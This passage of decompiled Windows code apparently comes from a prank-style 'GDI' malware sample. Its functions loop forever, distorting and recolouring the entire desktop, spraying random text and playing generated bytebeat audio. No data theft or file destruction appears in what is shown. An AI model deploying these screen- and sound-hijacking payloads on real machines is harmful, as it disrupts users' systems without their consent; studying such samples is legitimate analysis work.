      TextOutW(hdcSrc, v43 % SystemMetrics, v42, v34, v41);
    }
    v76 = v4 + 1;
    v44 = 0.0;
    DC = GetDC(0LL);
    v45 = GetSystemMetrics(0);
    v46 = GetSystemMetrics(1);
    CompatibleDC = CreateCompatibleDC(DC);
    CompatibleBitmap = CreateCompatibleBitmap(DC, v45, v46);
    SelectObject(CompatibleDC, CompatibleBitmap);
    pbmi.bmiHeader.biSize = 44;
    pbmi.bmiHeader.biWidth = v45;
    pbmi.bmiHeader.biHeight = v46;
    *(_QWORD *)&pbmi.bmiHeader.biPlanes = 2097153LL;
    memset(&pbmi.bmiHeader.biSizeImage, 0, 24);
    ppvBits = 0LL;
    h = CreateDIBSection(DC, &pbmi, 0, &ppvBits, 0LL, 0);
    SelectObject(CompatibleDC, h);
    SelectObject(CompatibleDC, h);
    v48 = GetSystemMetrics(0);
    v49 = GetSystemMetrics(1);
    GetDC(0LL);
    v50 = GetDC(0LL);
    CreateCompatibleDC(v50);
    CreateCompatibleDC(v50);
    CreateCompatibleBitmap(v50, v48, v49);
    ReleaseDC(0LL, v50);
    v51 = CompatibleDC;
    BitBlt(CompatibleDC, 0, 0, v45, v46, DC, 0, 0, 0xCC0020u);
    if ( (int)v45 > 0 )
    {
      v52 = 0;
      do
      {
        v53 = 0;
        if ( v46 > 0 )
        {
          v54 = 4LL * (unsigned int)v52;
          do
          {
            v55 = *((_DWORD *)ppvBits
                  + (_DWORD)v45 * (v53 % (unsigned int)v46)
                  + (v52
                   - (int)(float)(flt_14000A650[(int)(float)((float)((float)((float)((float)((float)v53 / 25.0) + 0.0)
                                                                           + 1.570796)
                                                                   / 6.2831841)
                                                           * 4096.0) & 0xFFF]
                                * -16.0))
                  % (unsigned int)v45);
            *((_BYTE *)ppvBits + v54 + 2) = (int)(float)((float)((float)(unsigned __int8)v55 * 0.875)
                                                       + (float)((float)*((unsigned __int8 *)ppvBits + v54) * 0.125));
            v56 = sub_140001000(v90, v55);
            v57 = *(_QWORD *)v56;
            v58 = *((_DWORD *)v56 + 2);
            v59 = fmod(
                    (float)((float)((float)v52 + (float)v53) / (float)((float)((float)v46 + (float)(int)v45) * 10.0))
                  + COERCE_FLOAT(*(_QWORD *)v56)
                  + 0.06666666666666667,
                    1.0);
            v89 = v58;
            v60 = v59;
            *(float *)&v57 = v60;
            v88 = v57;
            v61 = sub_1400011F0((float *)&v88);
            ++v53;
            *(_DWORD *)((char *)ppvBits + v54) = v61;
            v54 += 4 * v45;
          }
          while ( v53 < v46 );
        }
        ++v52;
      }
      while ( v52 < (int)v45 );
      v2 = v72;
      v3 = v73;
      v51 = CompatibleDC;
    }
    x1 = 0;
    if ( (int)v45 + 10 > 0 )
    {
      do
      {
        v63 = cos(v44);
        v64 = cos(v44 / 5.0);
        y1 = (int)sin(v64 * 5.0 * 3.141592025756836 + v44) - (int)((v63 + v63) * -3.141592025756836);
        BitBlt(v51, x1, 0, 1, v46, v51, x1, y1, 0xCC0020u);
        BitBlt(v51, 0, x1, v45, 1, v51, y1, x1, 0xCC0020u);
        v44 = v44 + 0.004999999888241291;
        ++x1;
      }
      while ( x1 < (int)v45 + 10 );
      v2 = v72;
      v3 = v73;
    }
    BitBlt(DC, 0, 0, v45, v46, v51, 0, 0, 0xCC0020u);
    v66 = CreateCompatibleDC(DC);
    v95.bmiHeader.biSize = 44;
    memset(&v95.bmiHeader.biCompression, 0, 28);
    *(_DWORD *)&v95.bmiHeader.biPlanes = 2097153;
    v67 = v66;
    v93 = 0LL;
    v95.bmiHeader.biWidth = v45;
    v95.bmiHeader.biHeight = v46;
    CreateDIBSection(DC, &v95, 0, &v93, 0LL, 0);
    SelectObject(v67, h);
    v68 = GetDC(0LL);
    BitBlt(v67, 0, 0, v45, v46, v68, 0, 0, 0xCC0020u);
    v69 = 0;
    if ( (int)v45 * v46 > 0 )
    {
      v70 = 0LL;
      do
      {
        v70 += 4LL;
        v71 = v69++;
        *(_DWORD *)((char *)v93 + v70 - 4) ^= (v71 % (int)v45) & (v71 / (int)v45);
      }
      while ( v69 < (int)v45 * v46 );
    }
    BitBlt(v68, 0, 0, v45, v46, v67, 0, 50, 0xCC0020u);
    BitBlt(v68, 0, 0, v45, v46, v67, 0, 50 - v46, 0xCC0020u);
    ReleaseDC(0LL, v68);
    DeleteDC(v68);
    v4 = v76;
    v7 = v85;
    v1 = hdcSrc;
    v6 = v81;
    v5 = v74;
  }
}
// 14000A650: using guessed type float flt_14000A650[4096];
// 1400039E0: using guessed type LPCWSTR lpString[14];
// 1400039E0: using guessed type float var_1C0[4];

//----- (0000000140004560) ----------------------------------------------------
void __fastcall __noreturn sub_140004560(LPVOID lpThreadParameter)
{
  HDC CompatibleDC; // rsi
  int SystemMetrics; // r15d
  int cy; // r12d
  __int128 v4; // xmm11
  HBITMAP CompatibleBitmap; // rbx
  HDC hdcSrc; // r14
  double v7; // xmm7_8
  int v8; // r13d
  int x1; // edi
  double v10; // xmm6_8
  double v11; // xmm0_8
  int y1; // ebx
  HDC v13; // rbx
  int v14; // edi
  int v15; // eax
  int v16; // ebx
  int v17; // r11d
  __int64 v18; // r9
  int v19; // ebx
  int v20; // r10d
  HWND DesktopWindow; // rax
  __int128 v22; // xmm0
  double v23; // xmm6_8
  double v24; // xmm1_8
  HDC v25; // rdi
  int v26; // ebx
  int v27; // eax
  int v28; // [rsp+68h] [rbp-A0h]
  HDC hdc; // [rsp+70h] [rbp-98h]
  HDC v30; // [rsp+78h] [rbp-90h]
  HDC v31; // [rsp+80h] [rbp-88h]
  HBITMAP h; // [rsp+88h] [rbp-80h]
  HDC DC; // [rsp+90h] [rbp-78h]
  void *ppvBits; // [rsp+98h] [rbp-70h] BYREF
  struct tagRECT Rect; // [rsp+A0h] [rbp-68h] BYREF
  BITMAPINFO pbmi; // [rsp+B0h] [rbp-58h] BYREF
  POINT Point; // [rsp+E0h] [rbp-28h] BYREF
  int v38; // [rsp+E8h] [rbp-20h]
  int v39; // [rsp+ECh] [rbp-1Ch]
  int v40; // [rsp+F0h] [rbp-18h]
  int v41; // [rsp+F4h] [rbp-14h]

  DC = GetDC(0LL);
  CompatibleDC = CreateCompatibleDC(DC);
  SystemMetrics = GetSystemMetrics(0);
  cy = GetSystemMetrics(1);
  v4 = 0LL;
  CompatibleBitmap = CreateCompatibleBitmap(DC, SystemMetrics, cy);
  hdcSrc = GetDC(0LL);
  v30 = hdcSrc;
  v7 = 0.0;
  SelectObject(CompatibleDC, CompatibleBitmap);
  v8 = SystemMetrics + 10;
  while ( 1 )
  {
    BitBlt(CompatibleDC, 0, 0, SystemMetrics, cy, hdcSrc, 0, 0, 0xCC0020u);
    x1 = 0;
    if ( v8 > 0 )
    {
      do
      {
        v10 = cos(v7);
        v11 = cos(v7);
        y1 = (int)sin(v11 * 3.141592025756836 + v7) - (int)((v10 + v10) * -3.141592025756836);
        BitBlt(CompatibleDC, x1, 0, 1, cy, CompatibleDC, x1, y1, 0xCC0020u);
        BitBlt(CompatibleDC, 0, x1, SystemMetrics, 1, CompatibleDC, y1, x1, 0xCC0020u);
        ++x1;
        v7 = v7 + 0.008999999612569809;
      }
      while ( x1 < v8 );
      hdcSrc = v30;
    }
    BitBlt(hdcSrc, 0, 0, SystemMetrics, cy, CompatibleDC, 0, 0, 0xCC0020u);
    v13 = GetDC(0LL);
    v31 = CreateCompatibleDC(v13);
    v14 = GetSystemMetrics(0);
    v15 = GetSystemMetrics(1);
    pbmi.bmiHeader.biSize = 44;
    memset(&pbmi.bmiHeader.biCompression, 0, 28);
    ppvBits = 0LL;
    v28 = v15;
    *(_DWORD *)&pbmi.bmiHeader.biPlanes = 2097153;
    pbmi.bmiHeader.biWidth = v14;
    pbmi.bmiHeader.biHeight = v15;
    h = CreateDIBSection(v13, &pbmi, 0, &ppvBits, 0LL, 0);
    SelectObject(v31, h);
    v16 = v28;
    hdc = GetDC(0LL);
    BitBlt(v31, 0, 0, v14, v28, hdc, 0, 0, 0xCC0020u);
    v17 = 0;
    if ( v14 * v28 > 0 )
    {
      v18 = 0LL;
      do
      {
        v19 = v17 % v14;
        v20 = v17 / v14;
        if ( v17 / v14 )
          *(_DWORD *)((char *)ppvBits + v18) += v17 / v20;
        ++v17;
        *(_DWORD *)((char *)ppvBits + v18) %= 0xFFFFFFu;
        *(_DWORD *)((char *)ppvBits + v18) ^= v19 & v20;
        v18 += 4LL;
      }
      while ( v17 < v14 * v28 );
      v16 = v28;
    }
    BitBlt(hdc, 0, 0, v14, v16, v31, 0, 70, 0xCC0020u);
    BitBlt(hdc, 0, 0, v14, v16, v31, 0, 70 - v16, 0xCC0020u);
    SelectObject(CompatibleDC, h);
    DesktopWindow = GetDesktopWindow();
    GetWindowRect(DesktopWindow, &Rect);
    *((_QWORD *)&v22 + 1) = *((_QWORD *)&v4 + 1);
    *(double *)&v22 = fmod(*(double *)&v4 + 0.06280000000000001, 6.28);
    v4 = v22;
    v23 = cos(*(double *)&v22) * 50.0;
    *(double *)&v22 = cos(*(double *)&v4);
    v24 = (double)(int)(sin(*(double *)&v22) * 50.0 + v23) + v23;
    Point.x = Rect.left - (int)v24;
    Point.y = Rect.top + (int)v24;
    v39 = Rect.top - (int)v24;
    v38 = Rect.right - (int)v24;
    v41 = (int)v24 + Rect.bottom;
    v40 = Rect.left + (int)v24;
    BitBlt(CompatibleDC, 0, 0, v14, v16, DC, 0, 0, 0xCC0020u);
    PlgBlt(
      CompatibleDC,
      &Point,
      CompatibleDC,
      Rect.left,
      Rect.top,
      Rect.right - Rect.left,
      Rect.bottom - Rect.top,
      0LL,
      0,
      0);
    BitBlt(DC, 0, 0, v14, v16, CompatibleDC, 0, 0, 0x1100A6u);
    v25 = GetDC(0LL);
    v26 = GetSystemMetrics(0);
    v27 = GetSystemMetrics(1);
    StretchBlt(v25, -10, -10, v26 + 20, v27 + 20, v25, 0, 0, v26, v27, 0x440328u);
    hdcSrc = v30;
  }
}

//----- (0000000140004AE0) ----------------------------------------------------
void __fastcall __noreturn sub_140004AE0(LPVOID lpThreadParameter)
{
  HDC v1; // rdi
  int v2; // r14d
  int v3; // r15d
  int v4; // r13d
  LONG v5; // r12d
  char *v6; // rsi
  void *v7; // rbx
  HFONT FontW; // rax
  int v9; // r12d
  int v10; // ebx
  int v11; // edi
  int v12; // eax
  double v13; // xmm6_8
  double v14; // xmm7_8
  __m128i v15; // xmm5
  __int64 v16; // rax
  double v17; // xmm5_8
  int v18; // ecx
  int v19; // ebx
  int *v20; // r10
  float v21; // xmm0_4
  double v22; // xmm1_8
  float v23; // xmm0_4
  float v24; // xmm2_4
  int v25; // r9d
  double v26; // xmm1_8
  float v27; // xmm0_4
  float v28; // xmm3_4
  float v29; // xmm4_4
  int i; // r8d
  int j; // edx
  int v32; // edx
  unsigned int v33; // ebx
  const WCHAR *v34; // rsi
  int v35; // eax
  unsigned int v36; // r11d
  int v37; // r9d
  int v38; // r10d
  unsigned int v39; // edx
  unsigned int v40; // ecx
  int v41; // edi
  int v42; // ebx
  int v43; // eax
  double v44; // xmm9_8
  __int64 v45; // rsi
  int v46; // r13d
  HDC v47; // r12
  HBITMAP CompatibleBitmap; // rax
  int v49; // edi
  int v50; // ebx
  int v51; // r15d
  int v52; // r12d
  __int64 v53; // rdi
  int v54; // edx
  float *v55; // rax
  __int64 v56; // xmm6_8
  int v57; // ebx
  double v58; // xmm0_8
  float v59; // xmm1_4
  int v60; // eax
  int x1; // edi
  double v62; // xmm0_8
  int v63; // ebx
  int y1; // ebx
  HDC v65; // rax
  HDC v66; // rdi
  HDC v67; // rbx
  int v68; // r9d
  __int64 v69; // r8
  int v70; // eax
  int v71; // [rsp+78h] [rbp-90h]
  int v72; // [rsp+7Ch] [rbp-8Ch]
  DWORD v73; // [rsp+80h] [rbp-88h]
  int *v74; // [rsp+88h] [rbp-80h]
  int v75; // [rsp+88h] [rbp-80h]
  HDC DC; // [rsp+90h] [rbp-78h]
  int cy; // [rsp+98h] [rbp-70h]
  int SystemMetrics; // [rsp+9Ch] [rbp-6Ch]
  HDC hDC; // [rsp+B0h] [rbp-58h]
  HDC hdcSrc; // [rsp+B8h] [rbp-50h]
  char *v81; // [rsp+C0h] [rbp-48h]
  HBITMAP hbit; // [rsp+C8h] [rbp-40h]
  HDC hdc; // [rsp+D0h] [rbp-38h]
  LPVOID v84; // [rsp+D8h] [rbp-30h]
  unsigned int v85; // [rsp+E0h] [rbp-28h]
  HDC CompatibleDC; // [rsp+E8h] [rbp-20h]
  HBITMAP h; // [rsp+F0h] [rbp-18h]
  __int64 v88; // [rsp+F8h] [rbp-10h] BYREF
  int v89; // [rsp+100h] [rbp-8h]
  float v90[4]; // [rsp+108h] [rbp+0h] BYREF
  LPCWSTR lpString[14]; // [rsp+118h] [rbp+10h]
  void *ppvBits; // [rsp+188h] [rbp+80h] BYREF
  void *v93; // [rsp+190h] [rbp+88h] BYREF
  BITMAPINFO pbmi; // [rsp+198h] [rbp+90h] BYREF
  BITMAPINFO v95; // [rsp+1C8h] [rbp+C0h] BYREF
  struct tagSIZE sz; // [rsp+1F8h] [rbp+F0h] BYREF

  v85 = __rdtsc();
  hdcSrc = GetDC(0LL);
  v1 = hdcSrc;
  SystemMetrics = GetSystemMetrics(0);
  cy = GetSystemMetrics(1);
  v71 = GetSystemMetrics(0);
  v2 = v71;
  v72 = GetSystemMetrics(1);
  v3 = v72;
  hdc = CreateCompatibleDC(hdcSrc);
  hbit = CreateCompatibleBitmap(hdcSrc, SystemMetrics, cy);
  SelectObject(hdc, hbit);
  v4 = 0;
  BitBlt(hdc, 0, 0, SystemMetrics, cy, hdcSrc, 0, 0, 0xCC0020u);
  GetProcessHeap();
  v5 = 4 * SystemMetrics * v72;
  v73 = v5;
  v81 = (char *)VirtualAlloc(0LL, v5, 0x3000u, 4u);
  v6 = v81;
  v84 = VirtualAlloc(0LL, v5, 0x3000u, 4u);
  v7 = v84;
  FontW = CreateFontW(48, 0, 0, 0, 0, 0, 0, 0, 1u, 8u, 0, 5u, 2u, L"Verdana");
  SelectObject(hdcSrc, FontW);
  SetBkMode(hdcSrc, 1);
  while ( 1 )
  {
    BitBlt(hdc, 0, 0, v2, v3, v1, 0, 0, 0xCC0090u);
    GetBitmapBits(hbit, v5, v7);
    v9 = 0;
    if ( v3 > 0 )
    {
      v10 = rand() & 0xFFF;
      v11 = 0;
      v12 = rand() & 0xFFF;
      v74 = (int *)v81;
      v13 = (double)(v12 + v10);
      v14 = (double)(2 * v12);
      v15 = _mm_cvtsi32_si128(2 * (rand() & 0xFFFu));
      v16 = 4LL * v2;
      *(_QWORD *)&v17 = *(_OWORD *)&_mm_cvtepi32_pd(v15);
      do
      {
        v18 = 0;
        v19 = 0;
        if ( v2 > 0 )
        {
          v20 = v74;
          v21 = COERCE_DOUBLE(*(_QWORD *)&v13 & 0x7FFFFFFFFFFFFFFFLL);
          v22 = v21 + 0.64999998;
          v23 = COERCE_DOUBLE(*(_QWORD *)&v14 & 0x7FFFFFFFFFFFFFFFLL);
          v24 = v22;
          v25 = (v11 + v4) % 150 - 250;
          v26 = v23 + 0.64999998;
          v27 = fabs(v17);
          do
          {
            for ( i = v25 % v2; i < 0; i += v2 )
              ;
            for ( j = ((v4 + v18) % 3 + v9 - 1) % v3; j < 0; j += v3 )
              ;
            ++v25;
            v32 = *((_DWORD *)v84 + (unsigned int)i + (__int64)(v2 * j));
            v18 = v19 + 1;
            v29 = v27 + 0.64999998;
            v28 = v26;
            *v20 = (unsigned __int8)(int)(float)((float)(unsigned __int8)v32 * v29) | (((unsigned __int8)(int)(float)((float)v32 * v28) | ((unsigned __int8)(int)(float)((float)v32 * v24) << 9)) << 9);
            v19 = v18;
            ++v20;
          }
          while ( v18 < v2 );
          v6 = (char *)v74;
          v11 = v9;
          v16 = 4LL * v2;
        }
        ++v11;
        v6 += v16;
        v74 = (int *)v6;
        v9 = v11;
      }
      while ( v11 < v3 );
      v1 = hdcSrc;
      v6 = v81;
    }
    SetBitmapBits(hbit, v73, v6);
    BitBlt(v1, 0, 0, v2, v3, hdc, 0, 0, 0xCC0020u);
    if ( (v4 & 1) != 0 )
    {
      v33 = (v85 << 13) ^ ((v85 & 0x7FFF0 ^ (v85 >> 13)) >> 4) ^ (32
                                                                * (v85 ^ (v85 << 13) ^ ((v85 & 0x7FFF0 ^ (v85 >> 13)) >> 4)));
      v34 = lpString[rand() % 13];
      v35 = lstrlenW(v34);
      GetTextExtentPointW(v1, v34, v35, &sz);
      v36 = v33 ^ (v33 << 13);
      v37 = v33 ^ (v33 << 13) ^ (v36 >> 17);
      v38 = v37 << 18;
      v37 *= 32;
      v39 = (v36 & 0xFFFE000F ^ ((v33 & 0x3F) << 13) ^ (v33 ^ v37) & 0x7FFF0 ^ ((v37 ^ (v36 >> 4)) >> 13)) >> 4;
      v40 = v33 ^ v37 ^ v39 ^ v38 ^ (v36 << 13) ^ (32 * (v33 ^ v37 ^ v39 ^ v38 ^ (v33 << 13) ^ (v36 << 13)));
      SetTextColor(v1, v40 ^ (32 * (v40 ^ (v40 >> 17))) ^ ((v40 & 0x7FFF0 ^ (v40 >> 13)) >> 4));
      v41 = lstrlenW(v34);
      v42 = rand() % cy;
      v43 = rand();
      TextOutW(hdcSrc, v43 % SystemMetrics, v42, v34, v41);
    }
    v75 = v4 + 1;
    v44 = 0.0;
    DC = GetDC(0LL);
    v45 = GetSystemMetrics(0);
    v46 = GetSystemMetrics(1);
    CompatibleDC = CreateCompatibleDC(DC);
    v47 = CompatibleDC;
    CompatibleBitmap = CreateCompatibleBitmap(DC, v45, v46);
    SelectObject(CompatibleDC, CompatibleBitmap);
    pbmi.bmiHeader.biSize = 44;
    ppvBits = 0LL;
    pbmi.bmiHeader.biWidth = v45;
    pbmi.bmiHeader.biHeight = v46;
    *(_QWORD *)&pbmi.bmiHeader.biPlanes = 2097153LL;
    memset(&pbmi.bmiHeader.biSizeImage, 0, 24);
    h = CreateDIBSection(DC, &pbmi, 0, &ppvBits, 0LL, 0);
    SelectObject(CompatibleDC, h);
    SelectObject(CompatibleDC, h);
    v49 = GetSystemMetrics(0);
    v50 = GetSystemMetrics(1);
    GetDC(0LL);
    hDC = GetDC(0LL);
    CreateCompatibleDC(hDC);
    CreateCompatibleDC(hDC);
    CreateCompatibleBitmap(hDC, v49, v50);
    ReleaseDC(0LL, hDC);
    BitBlt(CompatibleDC, 0, 0, v45, v46, DC, 0, 0, 0xCC0020u);
    if ( (int)v45 > 0 )
    {
      v51 = 0;
      do
      {
        v52 = 0;
        if ( v46 > 0 )
        {
          v53 = 4LL * (unsigned int)v51;
          do
          {
            v54 = *((_DWORD *)ppvBits
                  + (_DWORD)v45 * (v52 % (unsigned int)v46)
                  + (v51
                   - (int)(float)(flt_14000A650[(int)(float)((float)((float)((float)((float)((float)v52 / 25.0) + 0.0)
                                                                           + 1.570796)
                                                                   / 6.2831841)
                                                           * 4096.0) & 0xFFF]
                                * -16.0))
                  % (unsigned int)v45);
            *((_BYTE *)ppvBits + v53 + 2) = (int)(float)((float)((float)(unsigned __int8)v54 * 0.875)
                                                       + (float)((float)*((unsigned __int8 *)ppvBits + v53) * 0.125));
            v55 = sub_140001000(v90, v54);
            v56 = *(_QWORD *)v55;
            v57 = *((_DWORD *)v55 + 2);
            v58 = fmod(
                    (float)((float)((float)v51 + (float)v52) / (float)((float)((float)v46 + (float)(int)v45) * 10.0))
                  + COERCE_FLOAT(*(_QWORD *)v55)
                  + 0.06666666666666667,
                    1.0);
            v89 = v57;
            v59 = v58;
            *(float *)&v56 = v59;
            v88 = v56;
            v60 = sub_1400011F0((float *)&v88);
            ++v52;
            *(_DWORD *)((char *)ppvBits + v53) = v60;
            v53 += 4 * v45;
          }
          while ( v52 < v46 );
        }
        ++v51;
      }
      while ( v51 < (int)v45 );
      v2 = v71;
      v3 = v72;
      v47 = CompatibleDC;
    }
    x1 = 0;
    if ( (int)v45 + 10 > 0 )
    {
      do
      {
        v62 = cos(v44 / 5.0);
        v63 = (int)sin(v62 * 5.0 * 3.141592025756836 + v44);
        y1 = v63 - (int)(cos(v44) * -10.0 * 3.141592025756836);
        BitBlt(v47, x1, 0, 1, v46, v47, x1, y1, 0xCC0020u);
        BitBlt(v47, 0, x1, v45, 1, v47, y1, x1, 0xCC0020u);
        v44 = v44 + 0.004999999888241291;
        ++x1;
      }
      while ( x1 < (int)v45 + 10 );
      v2 = v71;
      v3 = v72;
    }
    BitBlt(DC, 0, 0, v45, v46, v47, 0, 0, 0x440328u);
    v65 = CreateCompatibleDC(DC);
    v95.bmiHeader.biSize = 44;
    memset(&v95.bmiHeader.biCompression, 0, 28);
    *(_DWORD *)&v95.bmiHeader.biPlanes = 2097153;
    v66 = v65;
    v93 = 0LL;
    v95.bmiHeader.biWidth = v45;
    v95.bmiHeader.biHeight = v46;
    CreateDIBSection(DC, &v95, 0, &v93, 0LL, 0);
    SelectObject(v66, h);
    v67 = GetDC(0LL);
    BitBlt(v66, 0, 0, v45, v46, v67, 0, 0, 0xCC0020u);
    v68 = 0;
    if ( (int)v45 * v46 > 0 )
    {
      v69 = 0LL;
      do
      {
        v69 += 4LL;
        v70 = v68++;
        *(_DWORD *)((char *)v93 + v69 - 4) ^= (v70 / (int)v45) & (v70 % (int)v45);
      }
      while ( v68 < (int)v45 * v46 );
    }
    BitBlt(v67, 0, 0, v45, v46, v66, 0, 50, 0x660046u);
    BitBlt(v67, 0, 0, v45, v46, v66, 0, 50 - v46, 0xCC0020u);
    ReleaseDC(0LL, hDC);
    ReleaseDC(0LL, v67);
    DeleteDC(v67);
    v4 = v75;
    v7 = v84;
    v1 = hdcSrc;
    v6 = v81;
    v5 = v73;
  }
}
// 14000A650: using guessed type float flt_14000A650[4096];
// 140004AE0: using guessed type LPCWSTR lpString[14];
// 140004AE0: using guessed type float var_1C0[4];

//----- (0000000140005660) ----------------------------------------------------
MMRESULT sub_140005660()
{
  char *v0; // rdi
  unsigned int i; // ebx
  double v2; // xmm0_8
  double v3; // xmm0_8
  HWAVEOUT phwo; // [rsp+30h] [rbp-D0h] BYREF
  struct wavehdr_tag pwh; // [rsp+38h] [rbp-C8h] BYREF
  WAVEFORMATEX pwfx; // [rsp+68h] [rbp-98h] BYREF
  char v8[960000]; // [rsp+80h] [rbp-80h] BYREF

  *(_DWORD *)&pwfx.wFormatTag = 65537;
  phwo = 0LL;
  pwfx.nSamplesPerSec = 48000;
  pwfx.nAvgBytesPerSec = 48000;
  *(_DWORD *)&pwfx.nBlockAlign = 524289;
  pwfx.cbSize = 0;
  waveOutOpen(&phwo, 0xFFFFFFFF, &pwfx, 0LL, 0LL, 0);
  v0 = v8;
  for ( i = 0; i < 0xEA600; ++i )
  {
    v2 = sin((double)(i / 0xA));
    v3 = sin(v2 - (double)(int)(i / (((i >> 9) & (i >> 13)) % 9 + 9)));
    *v0++ = (int)(v3 * 94.0 + 128.0);
  }
  pwh.lpData = v8;
  *(_QWORD *)&pwh.dwBufferLength = 960000LL;
  memset(&pwh.dwUser, 0, 32);
  waveOutPrepareHeader(phwo, &pwh, 0x30u);
  waveOutWrite(phwo, &pwh, 0x30u);
  waveOutUnprepareHeader(phwo, &pwh, 0x30u);
  return waveOutClose(phwo);
}

//----- (0000000140005830) ----------------------------------------------------
MMRESULT sub_140005830()
{
  int v0; // r8d
  char *v1; // r10
  int v2; // r11d
  unsigned int v3; // r9d
  int v4; // ecx
  unsigned int v5; // eax
  unsigned int v6; // edx
  HWAVEOUT phwo; // [rsp+30h] [rbp-D0h] BYREF
  struct wavehdr_tag pwh; // [rsp+38h] [rbp-C8h] BYREF
  WAVEFORMATEX pwfx; // [rsp+68h] [rbp-98h] BYREF
  char v11[960000]; // [rsp+80h] [rbp-80h] BYREF

  *(_DWORD *)&pwfx.wFormatTag = 65537;
  phwo = 0LL;
  pwfx.nSamplesPerSec = 48000;
  pwfx.nAvgBytesPerSec = 48000;
  *(_DWORD *)&pwfx.nBlockAlign = 524289;
  pwfx.cbSize = 0;
  waveOutOpen(&phwo, 0xFFFFFFFF, &pwfx, 0LL, 0LL, 0);
  v0 = 0;
  v1 = v11;
  v2 = 0;
  v3 = 0;
  do
  {
    v4 = v0 * (v0 + 29);
    ++v1;
    v5 = v3 >> 4;
    ++v0;
    v3 += 4;
    v6 = (42999957 * v5 - v4) >> v2;
    v2 += 19;
    *(v1 - 1) = v6 >> 19;
  }
  while ( v3 < 0x3A9800 );
  pwh.lpData = v11;
  *(_QWORD *)&pwh.dwBufferLength = 960000LL;
  memset(&pwh.dwUser, 0, 32);
  waveOutPrepareHeader(phwo, &pwh, 0x30u);
  waveOutWrite(phwo, &pwh, 0x30u);
  waveOutUnprepareHeader(phwo, &pwh, 0x30u);
  return waveOutClose(phwo);
}

//----- (0000000140005990) ----------------------------------------------------
MMRESULT sub_140005990()
{
  char *v0; // rdi
  unsigned int i; // ebx
  double v2; // xmm0_8
  double v3; // xmm0_8
  HWAVEOUT phwo; // [rsp+30h] [rbp-D0h] BYREF
  struct wavehdr_tag pwh; // [rsp+38h] [rbp-C8h] BYREF
  WAVEFORMATEX pwfx; // [rsp+68h] [rbp-98h] BYREF
  char v8[960000]; // [rsp+80h] [rbp-80h] BYREF

  *(_DWORD *)&pwfx.wFormatTag = 65537;
  phwo = 0LL;
  pwfx.nSamplesPerSec = 48000;
  pwfx.nAvgBytesPerSec = 48000;
  *(_DWORD *)&pwfx.nBlockAlign = 524289;
  pwfx.cbSize = 2028;
  waveOutOpen(&phwo, 0xFFFFFFFF, &pwfx, 0LL, 0LL, 0);
  memset(&v8[1], 0, 0xEA5FFuLL);
  v0 = v8;
  for ( i = 0; i < 0xEA600; ++i )
  {
    v2 = sin((double)(i / 0x13));
    v3 = sin(v2 - (double)(int)(i / (((i >> 1) & (i >> 9)) % 9 + 99)));
    *v0++ = (int)(v3 * 94.0 + 120.0);
  }
  pwh.lpData = v8;
  *(_QWORD *)&pwh.dwBufferLength = 960000LL;
  memset(&pwh.dwUser, 0, 32);
  waveOutPrepareHeader(phwo, &pwh, 0x30u);
  waveOutWrite(phwo, &pwh, 0x30u);
  waveOutUnprepareHeader(phwo, &pwh, 0x30u);
  return waveOutClose(phwo);
}

//----- (0000000140005B70) ----------------------------------------------------
MMRESULT sub_140005B70()
{
  unsigned int v0; // r8d
  char *v1; // r9
  char v2; // dl
  char v3; // al
  HWAVEOUT phwo; // [rsp+30h] [rbp-D0h] BYREF
  struct wavehdr_tag pwh; // [rsp+38h] [rbp-C8h] BYREF
  WAVEFORMATEX pwfx; // [rsp+68h] [rbp-98h] BYREF
  char v8[882000]; // [rsp+80h] [rbp-80h] BYREF

  *(_DWORD *)&pwfx.wFormatTag = 65537;
  phwo = 0LL;
  pwfx.nSamplesPerSec = 44100;
  pwfx.nAvgBytesPerSec = 44100;
  *(_DWORD *)&pwfx.nBlockAlign = 524289;
  pwfx.cbSize = 2028;
  waveOutOpen(&phwo, 0xFFFFFFFF, &pwfx, 0LL, 0LL, 0);
  memset(&v8[1], 0, 0xD754FuLL);
  v0 = 0;
  v1 = v8;
  do
  {
    ++v1;
    v2 = v0 * (v0 & ((v0 >> 9) + (v0 & (v0 >> 9))));
    v3 = v0 & (v0 >> 10);
    ++v0;
    *(v1 - 1) = (v3 & 0xBE) + v2;
  }
  while ( v0 < 0xD7550 );
  pwh.lpData = v8;
  *(_QWORD *)&pwh.dwBufferLength = 882000LL;
  memset(&pwh.dwUser, 0, 32);
  waveOutPrepareHeader(phwo, &pwh, 0x30u);
  waveOutWrite(phwo, &pwh, 0x30u);
  waveOutUnprepareHeader(phwo, &pwh, 0x30u);
  return waveOutClose(phwo);
}

//----- (0000000140005CE0) ----------------------------------------------------
MMRESULT sub_140005CE0()
{
  unsigned int v0; // eax
  char *v1; // r9
  char v2; // dl
  char v3; // cl
  char v4; // r8
  char v5; // cl
  HWAVEOUT phwo; // [rsp+30h] [rbp-D0h] BYREF
  struct wavehdr_tag pwh; // [rsp+38h] [rbp-C8h] BYREF
  WAVEFORMATEX pwfx; // [rsp+68h] [rbp-98h] BYREF
  char v10[882000]; // [rsp+80h] [rbp-80h] BYREF

  *(_DWORD *)&pwfx.wFormatTag = 65537;
  phwo = 0LL;
  pwfx.nSamplesPerSec = 44100;
  pwfx.nAvgBytesPerSec = 44100;
  *(_DWORD *)&pwfx.nBlockAlign = 524289;
  pwfx.cbSize = 2028;
  waveOutOpen(&phwo, 0xFFFFFFFF, &pwfx, 0LL, 0LL, 0);
  memset(&v10[1], 0, 0xD754FuLL);
  v0 = 0;
  v1 = v10;
  do
  {
    ++v1;
    v2 = (v0 | BYTE1(v0)) + (v0 | (v0 >> 9));
    v3 = v0 >> 1;
    v4 = v0 & v3;
    v5 = v0++ | v3;
    *(v1 - 1) = v4 + v5 + v2;
  }
  while ( v0 < 0xD7550 );
  pwh.lpData = v10;
  *(_QWORD *)&pwh.dwBufferLength = 882000LL;
  memset(&pwh.dwUser, 0, 32);
  waveOutPrepareHeader(phwo, &pwh, 0x30u);
  waveOutWrite(phwo, &pwh, 0x30u);
  waveOutUnprepareHeader(phwo, &pwh, 0x30u);
  return waveOutClose(phwo);
}

//----- (0000000140005E50) ----------------------------------------------------
MMRESULT sub_140005E50()
{
  unsigned int v0; // r9d
  char *v1; // r10
  char v2; // r8
  unsigned int v3; // eax
  char v4; // cl
  HWAVEOUT phwo; // [rsp+30h] [rbp-D0h] BYREF
  struct wavehdr_tag pwh; // [rsp+38h] [rbp-C8h] BYREF
  WAVEFORMATEX pwfx; // [rsp+68h] [rbp-98h] BYREF
  char v9[960000]; // [rsp+80h] [rbp-80h] BYREF

  *(_DWORD *)&pwfx.wFormatTag = 65537;
  phwo = 0LL;
  pwfx.nSamplesPerSec = 48000;
